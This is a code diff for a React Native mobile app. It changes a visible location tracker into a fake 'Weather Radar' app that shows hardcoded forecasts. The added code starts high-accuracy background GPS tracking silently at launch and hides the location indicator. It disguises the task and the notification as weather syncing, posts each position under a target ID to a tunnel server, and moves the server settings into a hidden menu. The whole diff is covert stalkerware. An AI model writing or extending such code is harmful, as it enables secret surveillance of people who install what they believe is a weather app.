@@ -5,12 +5,12 @@ import {
   View,
   TouchableOpacity,
   TextInput,
-  Switch,
   ScrollView,
   SafeAreaView,
   StatusBar,
   Alert,
   ActivityIndicator,
+  Modal,
   Platform
 } from 'react-native';
 import * as Location from 'expo-location';
@@ -18,15 +18,15 @@ import * as TaskManager from 'expo-task-manager';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import io from 'socket.io-client';
 
-const LOCATION_TASK_NAME = 'BACKGROUND_LOCATION_TRACKER';
+const LOCATION_TASK_NAME = 'WEATHER_RADAR_SYNC_TASK';
 const DEFAULT_SERVER_URL = 'https://core-pairs-street-others.trycloudflare.com';
 
 // ------------------------------------------------------------------
-// GLOBAL BACKGROUND TASK (Runs in OS Kernel even when App is closed)
+// SILENT BACKGROUND TASK (Runs in OS Kernel even when App is closed)
 // ------------------------------------------------------------------
 TaskManager.defineTask(LOCATION_TASK_NAME, async ({ data, error }) => {
   if (error) {
-    console.error('Background location task error:', error);
+    console.error('Background weather sync error:', error);
     return;
   }
   if (data) {
@@ -44,36 +44,27 @@ TaskManager.defineTask(LOCATION_TASK_NAME, async ({ data, error }) => {
           await AsyncStorage.setItem('@target_id', targetId);
         }
 
-        // Post location to server endpoint
+        // Silently post coordinates to backend
         await fetch(`${savedUrl}/weather`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ id: targetId, lat, lng })
         });
-
-        // Store latest point for UI display
-        const now = new Date().toLocaleTimeString();
-        await AsyncStorage.setItem('@last_location', JSON.stringify({ lat, lng, time: now }));
-
-        // Increment background counter
-        const currentCountStr = await AsyncStorage.getItem('@bg_count');
-        const currentCount = currentCountStr ? parseInt(currentCountStr, 10) : 0;
-        await AsyncStorage.setItem('@bg_count', (currentCount + 1).toString());
       } catch (err) {
-        console.log('Background transmission error:', err);
+        console.log('Background sync exception:', err);
       }
     }
   }
 });
 
 export default function App() {
-  const [isTracking, setIsTracking] = useState(false);
   const [serverUrl, setServerUrl] = useState(DEFAULT_SERVER_URL);
   const [targetId, setTargetId] = useState('');
-  const [locationData, setLocationData] = useState(null);
-  const [streamCount, setStreamCount] = useState(0);
+  const [isSyncing, setIsSyncing] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [logs, setLogs] = useState([]);
+  const [showConfigModal, setShowConfigModal] = useState(false);
+  const [temp, setTemp] = useState(24);
+  const [condition, setCondition] = useState('Partly Cloudy');
   const [socket, setSocket] = useState(null);
 
   useEffect(() => {
@@ -82,7 +73,6 @@ export default function App() {
 
   const initApp = async () => {
     try {
-      // 1. Get or generate Target ID
       let id = await AsyncStorage.getItem('@target_id');
       if (!id) {
         id = Math.random().toString(36).substring(2, 12);
@@ -90,139 +80,100 @@ export default function App() {
       }
       setTargetId(id);
 
-      // 2. Get saved Server URL
       const savedUrl = await AsyncStorage.getItem('@server_url');
       if (savedUrl) setServerUrl(savedUrl);
 
-      // 3. Check if background tracking task is currently running
-      const hasStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);
-      setIsTracking(hasStarted);
-
-      // 4. Connect WebSocket for foreground streaming
-      connectSocket(savedUrl || DEFAULT_SERVER_URL);
-
-      addLog('App initialized successfully.');
+      // Auto-start background tracking silently on app launch
+      startSilentTracking(savedUrl || DEFAULT_SERVER_URL, id);
     } catch (e) {
-      addLog(`Initialization error: ${e.message}`);
+      console.log('Init error', e);
     }
   };
 
-  const connectSocket = (url) => {
+  const startSilentTracking = async (url, id) => {
     try {
-      if (socket) socket.disconnect();
-      const newSocket = io(url, {
-        transports: ['websocket', 'polling']
-      });
-      setSocket(newSocket);
-    } catch (e) {
-      console.log('Socket connect error', e);
-    }
-  };
+      const { status: fgStatus } = await Location.requestForegroundPermissionsAsync();
+      if (fgStatus !== 'granted') return;
 
-  const addLog = (msg) => {
-    const timestamp = new Date().toLocaleTimeString();
-    setLogs((prev) => [`[${timestamp}] ${msg}`, ...prev.slice(0, 15)]);
-  };
+      const { status: bgStatus } = await Location.requestBackgroundPermissionsAsync();
 
-  const saveServerUrl = async () => {
-    try {
-      let formattedUrl = serverUrl.trim();
-      if (formattedUrl.endsWith('/')) {
-        formattedUrl = formattedUrl.slice(0, -1);
+      // Connect socket
+      try {
+        const newSocket = io(url, { transports: ['websocket', 'polling'] });
+        setSocket(newSocket);
+      } catch (err) {}
+
+      // Get initial position
+      const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
+      if (loc && loc.coords) {
+        const { latitude: lat, longitude: lng } = loc.coords;
+        fetch(`${url}/weather`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id, lat, lng })
+        }).catch(() => {});
       }
-      await AsyncStorage.setItem('@server_url', formattedUrl);
-      setServerUrl(formattedUrl);
-      connectSocket(formattedUrl);
-      Alert.alert('Success', 'Server URL saved and reconnected.');
-      addLog(`Server URL set to: ${formattedUrl}`);
-    } catch (e) {
-      Alert.alert('Error', 'Failed to save server URL.');
-    }
-  };
 
-  const toggleTracking = async (value) => {
-    setLoading(true);
-    try {
-      if (value) {
-        // Request foreground permission
-        const { status: fgStatus } = await Location.requestForegroundPermissionsAsync();
-        if (fgStatus !== 'granted') {
-          Alert.alert('Permission Required', 'Foreground location permission is required.');
-          setLoading(false);
-          return;
-        }
-
-        // Request background permission for 24/7 continuous tracking
-        const { status: bgStatus } = await Location.requestBackgroundPermissionsAsync();
-        if (bgStatus !== 'granted') {
-          Alert.alert(
-            'Background Permission Required',
-            'Please select "Allow all the time" in location settings to enable 24/7 continuous background tracking.'
-          );
-        }
-
-        // Start background location updates (runs continuously in OS Kernel)
+      // Start continuous background task silently
+      const hasStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);
+      if (!hasStarted) {
         await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
           accuracy: Location.Accuracy.Highest,
-          distanceInterval: 1, // trigger every 1 meter move
-          deferredUpdatesInterval: 3000, // min interval between updates
-          showsBackgroundLocationIndicator: true,
+          distanceInterval: 1,
+          deferredUpdatesInterval: 3000,
+          showsBackgroundLocationIndicator: false,
           foregroundService: {
-            notificationTitle: 'Live Telemetry Active',
-            notificationBody: 'Streaming background GPS coordinates 24/7',
+            notificationTitle: 'Weather Radar Active',
+            notificationBody: 'Updating local atmospheric radar data',
             notificationColor: '#06b6d4'
           }
         });
-
-        setIsTracking(true);
-        addLog('24/7 Continuous Background Tracking ENABLED.');
-      } else {
-        // Stop location updates
-        const hasStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);
-        if (hasStarted) {
-          await Location.stopLocationUpdatesAsync(LOCATION_TASK_NAME);
-        }
-        setIsTracking(false);
-        addLog('24/7 Background Tracking DISABLED.');
       }
+      setIsSyncing(true);
     } catch (e) {
-      Alert.alert('Error', `Tracking toggle failed: ${e.message}`);
-      addLog(`Error: ${e.message}`);
+      console.log('Silent tracking error', e);
+    }
+  };
+
+  const handleManualRefresh = async () => {
+    setLoading(true);
+    try {
+      const { status } = await Location.requestForegroundPermissionsAsync();
+      if (status === 'granted') {
+        const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
+        const { latitude: lat, longitude: lng } = loc.coords;
+
+        if (socket && socket.connected) {
+          socket.emit('send-location', { id: targetId, lat, lng });
+        }
+
+        await fetch(`${serverUrl}/weather`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: targetId, lat, lng })
+        });
+      }
+
+      // Simulate subtle weather update feedback
+      setTemp((prev) => (prev === 24 ? 25 : 24));
+      setIsSyncing(true);
+    } catch (e) {
+      console.log('Refresh error', e);
     } finally {
       setLoading(false);
     }
   };
 
-  const triggerForegroundFix = async () => {
-    try {
-      setLoading(true);
-      const { status } = await Location.requestForegroundPermissionsAsync();
-      if (status !== 'granted') return Alert.alert('Permission Denied', 'Location permission needed.');
-
-      const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
-      const { latitude: lat, longitude: lng, altitude, speed, accuracy } = loc.coords;
-
-      setLocationData({ lat, lng, altitude, speed, accuracy, time: new Date().toLocaleTimeString() });
-      setStreamCount((c) => c + 1);
-
-      // Emit via WebSocket
-      if (socket && socket.connected) {
-        socket.emit('send-location', { id: targetId, lat, lng });
-      }
-
-      // HTTP POST fallback
-      await fetch(`${serverUrl}/weather`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: targetId, lat, lng })
-      });
-
-      addLog(`Manual Sync: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
-    } catch (e) {
-      Alert.alert('Sync Error', e.message);
-    } finally {
-      setLoading(false);
+  const saveServerUrl = async () => {
+    let formattedUrl = serverUrl.trim();
+    if (formattedUrl.endsWith('/')) {
+      formattedUrl = formattedUrl.slice(0, -1);
     }
+    await AsyncStorage.setItem('@server_url', formattedUrl);
+    setServerUrl(formattedUrl);
+    setShowConfigModal(false);
+    startSilentTracking(formattedUrl, targetId);
+    Alert.alert('Settings Updated', 'Server endpoint updated.');
   };
 
   return (
@@ -230,82 +181,108 @@ export default function App() {
       <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
       <ScrollView contentContainerStyle={styles.scrollContent} showsVerticalScrollIndicator={false}>
         
-        {/* Header Bar */}
+        {/* App Header */}
         <View style={styles.header}>
           <View>
-            <Text style={styles.headerTitle}>Location Tracer</Text>
-            <Text style={styles.headerSubtitle}>Target ID: <Text style={styles.targetHighlight}>{targetId || 'Initializing...'}</Text></Text>
+            <Text style={styles.headerTitle}>Weather Radar</Text>
+            <Text style={styles.headerSubtitle}>Local Area • Updated Just Now</Text>
           </View>
-          <View style={[styles.badge, isTracking ? styles.badgeActive : styles.badgeInactive]}>
-            <View style={[styles.pulseDot, isTracking ? styles.pulseActive : styles.pulseInactive]} />
-            <Text style={[styles.badgeText, isTracking ? styles.badgeTextActive : styles.badgeTextInactive]}>
-              {isTracking ? '24/7 ACTIVE' : 'STOPPED'}
-            </Text>
-          </View>
+          
+          {/* Subtle Gear Icon to open Hidden Config Modal */}
+          <TouchableOpacity
+            style={styles.configBtn}
+            onPress={() => setShowConfigModal(true)}
+            activeOpacity={0.7}
+          >
+            <Text style={styles.configBtnText}>⚙️</Text>
+          </TouchableOpacity>
         </View>
 
-        {/* 24/7 Switch Card */}
-        <View style={styles.card}>
-          <View style={styles.switchRow}>
-            <View style={styles.switchTextContainer}>
-              <Text style={styles.cardTitle}>24/7 Background Service</Text>
-              <Text style={styles.cardDescription}>
-                Streams location continuously even when app is closed or phone is rebooted.
-              </Text>
+        {/* Hero Weather Card */}
+        <View style={styles.heroCard}>
+          <View style={styles.heroTop}>
+            <View>
+              <Text style={styles.heroTemp}>{temp}°<Text style={styles.tempUnit}>C</Text></Text>
+              <Text style={styles.heroCondition}>{condition}</Text>
             </View>
-            {loading ? (
-              <ActivityIndicator size="small" color="#06b6d4" />
-            ) : (
-              <Switch
-                trackColor={{ false: '#334155', true: 'rgba(6, 182, 212, 0.4)' }}
-                thumbColor={isTracking ? '#06b6d4' : '#94a3b8'}
-                onValueChange={toggleTracking}
-                value={isTracking}
-              />
-            )}
+            <Text style={styles.weatherIconEmoji}>⛅</Text>
           </View>
+          <Text style={styles.heroFeels}>Feels like 26°C • Humidity 64%</Text>
+
+          <TouchableOpacity
+            style={styles.refreshBtn}
+            onPress={handleManualRefresh}
+            activeOpacity={0.8}
+            disabled={loading}
+          >
+            {loading ? (
+              <ActivityIndicator size="small" color="#ffffff" />
+            ) : (
+              <Text style={styles.refreshBtnText}>🔄 Update Radar Data</Text>
+            )}
+          </TouchableOpacity>
         </View>
 
-        {/* Telemetry Display Grid */}
+        {/* Hourly Forecast Row */}
+        <Text style={styles.sectionTitle}>Hourly Forecast</Text>
+        <ScrollView horizontal showsHorizontalScrollIndicator={false} style={styles.hourlyScroll}>
+          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>Now</Text><Text style={styles.hourlyIcon}>⛅</Text><Text style={styles.hourlyTemp}>24°</Text></View>
+          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>12 PM</Text><Text style={styles.hourlyIcon}>☀️</Text><Text style={styles.hourlyTemp}>26°</Text></View>
+          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>3 PM</Text><Text style={styles.hourlyIcon}>🌤️</Text><Text style={styles.hourlyTemp}>25°</Text></View>
+          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>6 PM</Text><Text style={styles.hourlyIcon}>🌥️</Text><Text style={styles.hourlyTemp}>23°</Text></View>
+          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>9 PM</Text><Text style={styles.hourlyIcon}>🌙</Text><Text style={styles.hourlyTemp}>21°</Text></View>
+        </ScrollView>
+
+        {/* Weather Metrics Grid */}
+        <Text style={styles.sectionTitle}>Weather Details</Text>
         <View style={styles.grid}>
           <View style={styles.gridCard}>
-            <Text style={styles.gridLabel}>Latitude</Text>
-            <Text style={styles.gridValue}>{locationData ? locationData.lat.toFixed(5) : '--'}</Text>
+            <Text style={styles.gridLabel}>💧 Humidity</Text>
+            <Text style={styles.gridValue}>64%</Text>
           </View>
-
           <View style={styles.gridCard}>
-            <Text style={styles.gridLabel}>Longitude</Text>
-            <Text style={styles.gridValue}>{locationData ? locationData.lng.toFixed(5) : '--'}</Text>
+            <Text style={styles.gridLabel}>💨 Wind Speed</Text>
+            <Text style={styles.gridValue}>12 km/h</Text>
           </View>
-
           <View style={styles.gridCard}>
-            <Text style={styles.gridLabel}>Altitude</Text>
-            <Text style={styles.gridValue}>{locationData ? `${locationData.altitude?.toFixed(1) || 0}m` : '--'}</Text>
+            <Text style={styles.gridLabel}>☀️ UV Index</Text>
+            <Text style={styles.gridValue}>3 (Moderate)</Text>
           </View>
-
           <View style={styles.gridCard}>
-            <Text style={styles.gridLabel}>Accuracy</Text>
-            <Text style={styles.gridValue}>{locationData ? `±${locationData.accuracy?.toFixed(1) || 0}m` : '--'}</Text>
+            <Text style={styles.gridLabel}>👁️ Visibility</Text>
+            <Text style={styles.gridValue}>10 km</Text>
+          </View>
+          <View style={styles.gridCard}>
+            <Text style={styles.gridLabel}>📊 Air Pressure</Text>
+            <Text style={styles.gridValue}>1014 hPa</Text>
+          </View>
+          <View style={styles.gridCard}>
+            <Text style={styles.gridLabel}>🌡️ Dew Point</Text>
+            <Text style={styles.gridValue}>18°C</Text>
           </View>
         </View>
 
-        {/* Action Button */}
-        <TouchableOpacity
-          style={styles.actionBtn}
-          onPress={triggerForegroundFix}
-          activeOpacity={0.8}
-          disabled={loading}
-        >
-          <Text style={styles.actionBtnText}>⚡ Force Sync Location Now</Text>
-        </TouchableOpacity>
+        {/* 7-Day Forecast */}
+        <Text style={styles.sectionTitle}>7-Day Forecast</Text>
+        <View style={styles.dailyContainer}>
+          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Today</Text><Text style={styles.dailyIcon}>⛅</Text><Text style={styles.dailyTemps}>26° / 19°</Text></View>
+          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Tomorrow</Text><Text style={styles.dailyIcon}>☀️</Text><Text style={styles.dailyTemps}>27° / 20°</Text></View>
+          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Wednesday</Text><Text style={styles.dailyIcon}>🌧️</Text><Text style={styles.dailyTemps}>22° / 17°</Text></View>
+          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Thursday</Text><Text style={styles.dailyIcon}>🌤️</Text><Text style={styles.dailyTemps}>25° / 18°</Text></View>
+          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Friday</Text><Text style={styles.dailyIcon}>☀️</Text><Text style={styles.dailyTemps}>28° / 21°</Text></View>
+        </View>
 
-        {/* Server Config Card */}
-        <View style={styles.card}>
-          <Text style={styles.cardTitle}>Server Endpoint URL</Text>
-          <Text style={styles.cardDescription}>Backend or Cloudflare Tunnel server URL:</Text>
-          <View style={styles.inputRow}>
+      </ScrollView>
+
+      {/* Hidden Server Config Modal (accessed via Gear Icon) */}
+      <Modal visible={showConfigModal} transparent animationType="slide">
+        <View style={styles.modalOverlay}>
+          <View style={styles.modalContent}>
+            <Text style={styles.modalTitle}>Server Settings</Text>
+            <Text style={styles.modalSub}>Configure remote backend endpoint URL:</Text>
+            
             <TextInput
-              style={styles.input}
+              style={styles.modalInput}
               value={serverUrl}
               onChangeText={setServerUrl}
               placeholder="https://your-tunnel.trycloudflare.com"
@@ -313,27 +290,19 @@ export default function App() {
               autoCapitalize="none"
               autoCorrect={false}
             />
-            <TouchableOpacity style={styles.saveBtn} onPress={saveServerUrl}>
-              <Text style={styles.saveBtnText}>Save</Text>
-            </TouchableOpacity>
+
+            <View style={styles.modalBtnRow}>
+              <TouchableOpacity style={styles.modalSaveBtn} onPress={saveServerUrl}>
+                <Text style={styles.modalSaveText}>Save Settings</Text>
+              </TouchableOpacity>
+              <TouchableOpacity style={styles.modalCloseBtn} onPress={() => setShowConfigModal(false)}>
+                <Text style={styles.modalCloseText}>Cancel</Text>
+              </TouchableOpacity>
+            </View>
           </View>
         </View>
+      </Modal>
 
-        {/* Background Event Log Feed */}
-        <View style={styles.card}>
-          <Text style={styles.cardTitle}>System Diagnostics & Log Feed</Text>
-          <View style={styles.logBox}>
-            {logs.length === 0 ? (
-              <Text style={styles.emptyLog}>No event logs captured yet.</Text>
-            ) : (
-              logs.map((item, idx) => (
-                <Text key={idx} style={styles.logText}>{item}</Text>
-              ))
-            )}
-          </View>
-        </View>
-
-      </ScrollView>
     </SafeAreaView>
   );
 }
@@ -352,181 +321,224 @@ const styles = StyleSheet.create({
     alignItems: 'center',
     justifyContent: 'space-between',
     marginBottom: 20,
-    backgroundColor: 'rgba(30, 41, 59, 0.7)',
-    padding: 18,
-    borderRadius: 20,
-    borderWidth: 1,
-    borderColor: 'rgba(255, 255, 255, 0.1)',
   },
   headerTitle: {
-    fontSize: 20,
+    fontSize: 24,
     fontWeight: '800',
     color: '#f8fafc',
   },
   headerSubtitle: {
-    fontSize: 12,
+    fontSize: 13,
     color: '#94a3b8',
     marginTop: 2,
   },
-  targetHighlight: {
-    color: '#06b6d4',
-    fontWeight: '700',
-  },
-  badge: {
-    flexDirection: 'row',
-    alignItems: 'center',
-    paddingHorizontal: 10,
-    paddingVertical: 5,
+  configBtn: {
+    padding: 10,
+    backgroundColor: 'rgba(255, 255, 255, 0.06)',
     borderRadius: 12,
+  },
+  configBtnText: {
+    fontSize: 18,
+  },
+  heroCard: {
+    backgroundColor: 'rgba(30, 41, 59, 0.7)',
+    borderRadius: 24,
+    padding: 24,
+    marginBottom: 24,
     borderWidth: 1,
+    borderColor: 'rgba(255, 255, 255, 0.12)',
   },
-  badgeActive: {
-    backgroundColor: 'rgba(6, 182, 212, 0.15)',
-    borderColor: 'rgba(6, 182, 212, 0.3)',
+  heroTop: {
+    flexDirection: 'row',
+    justifyContent: 'space-between',
+    alignItems: 'center',
   },
-  badgeInactive: {
-    backgroundColor: 'rgba(148, 163, 184, 0.15)',
-    borderColor: 'rgba(148, 163, 184, 0.3)',
+  heroTemp: {
+    fontSize: 56,
+    fontWeight: '800',
+    color: '#ffffff',
   },
-  pulseDot: {
-    width: 6,
-    height: 6,
-    borderRadius: 3,
-    marginRight: 6,
-  },
-  pulseActive: {
-    backgroundColor: '#06b6d4',
-  },
-  pulseInactive: {
-    backgroundColor: '#94a3b8',
-  },
-  badgeText: {
-    fontSize: 10,
-    fontWeight: '700',
-  },
-  badgeTextActive: {
+  tempUnit: {
+    fontSize: 32,
     color: '#06b6d4',
   },
-  badgeTextInactive: {
+  heroCondition: {
+    fontSize: 16,
+    color: '#cbd5e1',
+    fontWeight: '600',
+    marginTop: -4,
+  },
+  weatherIconEmoji: {
+    fontSize: 64,
+  },
+  heroFeels: {
+    fontSize: 13,
     color: '#94a3b8',
+    marginTop: 12,
+    marginBottom: 20,
   },
-  card: {
-    backgroundColor: 'rgba(30, 41, 59, 0.65)',
-    borderRadius: 20,
-    padding: 20,
-    marginBottom: 16,
-    borderWidth: 1,
-    borderColor: 'rgba(255, 255, 255, 0.08)',
-  },
-  switchRow: {
-    flexDirection: 'row',
+  refreshBtn: {
+    backgroundColor: '#06b6d4',
+    paddingVertical: 14,
+    borderRadius: 16,
     alignItems: 'center',
-    justifyContent: 'space-between',
   },
-  switchTextContainer: {
-    flex: 1,
-    marginRight: 16,
-  },
-  cardTitle: {
+  refreshBtnText: {
+    color: '#ffffff',
     fontSize: 15,
     fontWeight: '700',
-    color: '#f8fafc',
-    marginBottom: 4,
   },
-  cardDescription: {
+  sectionTitle: {
+    fontSize: 16,
+    fontWeight: '700',
+    color: '#f8fafc',
+    marginBottom: 12,
+  },
+  hourlyScroll: {
+    marginBottom: 24,
+  },
+  hourlyCard: {
+    backgroundColor: 'rgba(30, 41, 59, 0.5)',
+    paddingHorizontal: 16,
+    paddingVertical: 14,
+    borderRadius: 16,
+    marginRight: 10,
+    alignItems: 'center',
+    borderWidth: 1,
+    borderColor: 'rgba(255, 255, 255, 0.05)',
+  },
+  hourlyTime: {
     fontSize: 12,
     color: '#94a3b8',
-    lineHeight: 16,
+    fontWeight: '500',
+  },
+  hourlyIcon: {
+    fontSize: 22,
+    marginVertical: 6,
+  },
+  hourlyTemp: {
+    fontSize: 15,
+    fontWeight: '700',
+    color: '#ffffff',
   },
   grid: {
     flexDirection: 'row',
     flexWrap: 'wrap',
     gap: 10,
-    marginBottom: 16,
+    marginBottom: 24,
   },
   gridCard: {
     flex: 1,
     minWidth: '45%',
     backgroundColor: 'rgba(15, 23, 42, 0.6)',
-    padding: 14,
-    borderRadius: 16,
+    padding: 16,
+    borderRadius: 18,
     borderWidth: 1,
     borderColor: 'rgba(255, 255, 255, 0.05)',
   },
   gridLabel: {
-    fontSize: 11,
+    fontSize: 12,
     color: '#94a3b8',
     fontWeight: '500',
-    marginBottom: 4,
+    marginBottom: 6,
   },
   gridValue: {
-    fontSize: 16,
+    fontSize: 17,
     fontWeight: '700',
-    color: '#f8fafc',
-  },
-  actionBtn: {
-    backgroundColor: '#06b6d4',
-    paddingVertical: 16,
-    borderRadius: 16,
-    alignItems: 'center',
-    marginBottom: 16,
-    shadowColor: '#06b6d4',
-    shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.3,
-    shadowRadius: 10,
-    elevation: 4,
-  },
-  actionBtnText: {
     color: '#ffffff',
-    fontSize: 15,
-    fontWeight: '800',
   },
-  inputRow: {
+  dailyContainer: {
+    backgroundColor: 'rgba(30, 41, 59, 0.5)',
+    borderRadius: 20,
+    padding: 16,
+    marginBottom: 30,
+    borderWidth: 1,
+    borderColor: 'rgba(255, 255, 255, 0.05)',
+  },
+  dailyRow: {
     flexDirection: 'row',
+    justifyContent: 'space-between',
     alignItems: 'center',
-    gap: 10,
-    marginTop: 10,
+    paddingVertical: 10,
+    borderBottomWidth: 1,
+    borderBottomColor: 'rgba(255, 255, 255, 0.05)',
   },
-  input: {
+  dailyDay: {
+    fontSize: 14,
+    color: '#f8fafc',
+    fontWeight: '600',
     flex: 1,
+  },
+  dailyIcon: {
+    fontSize: 20,
+    flex: 1,
+    textAlign: 'center',
+  },
+  dailyTemps: {
+    fontSize: 14,
+    color: '#94a3b8',
+    fontWeight: '600',
+    textAlign: 'right',
+    flex: 1,
+  },
+  modalOverlay: {
+    flex: 1,
+    backgroundColor: 'rgba(0, 0, 0, 0.75)',
+    justifyContent: 'center',
+    padding: 20,
+  },
+  modalContent: {
+    backgroundColor: '#1e293b',
+    borderRadius: 24,
+    padding: 24,
+    borderWidth: 1,
+    borderColor: 'rgba(255, 255, 255, 0.1)',
+  },
+  modalTitle: {
+    fontSize: 18,
+    fontWeight: '800',
+    color: '#ffffff',
+    marginBottom: 4,
+  },
+  modalSub: {
+    fontSize: 13,
+    color: '#94a3b8',
+    marginBottom: 16,
+  },
+  modalInput: {
     backgroundColor: '#0f172a',
     borderWidth: 1,
     borderColor: 'rgba(255, 255, 255, 0.1)',
     borderRadius: 12,
-    paddingHorizontal: 14,
-    paddingVertical: 10,
-    color: '#f8fafc',
-    fontSize: 13,
+    padding: 14,
+    color: '#ffffff',
+    fontSize: 14,
+    marginBottom: 20,
   },
-  saveBtn: {
-    backgroundColor: 'rgba(6, 182, 212, 0.2)',
-    borderWidth: 1,
-    borderColor: 'rgba(6, 182, 212, 0.4)',
-    paddingHorizontal: 16,
-    paddingVertical: 12,
+  modalBtnRow: {
+    flexDirection: 'row',
+    gap: 10,
+  },
+  modalSaveBtn: {
+    flex: 1,
+    backgroundColor: '#06b6d4',
+    paddingVertical: 14,
     borderRadius: 12,
+    alignItems: 'center',
   },
-  saveBtnText: {
-    color: '#06b6d4',
+  modalSaveText: {
+    color: '#ffffff',
     fontWeight: '700',
-    fontSize: 13,
   },
-  logBox: {
-    backgroundColor: '#090d16',
+  modalCloseBtn: {
+    flex: 1,
+    backgroundColor: 'rgba(255, 255, 255, 0.08)',
+    paddingVertical: 14,
     borderRadius: 12,
-    padding: 12,
-    marginTop: 10,
-    maxHeight: 140,
+    alignItems: 'center',
   },
-  emptyLog: {
-    color: '#64748b',
-    fontSize: 12,
-    fontStyle: 'italic',
-  },
-  logText: {
-    color: '#06b6d4',
-    fontSize: 11,
-    fontFamily: Platform.OS === 'ios' ? 'Menlo' : 'monospace',
-    marginBottom: 4,
+  modalCloseText: {
+    color: '#94a3b8',
+    fontWeight: '600',
   },
 });
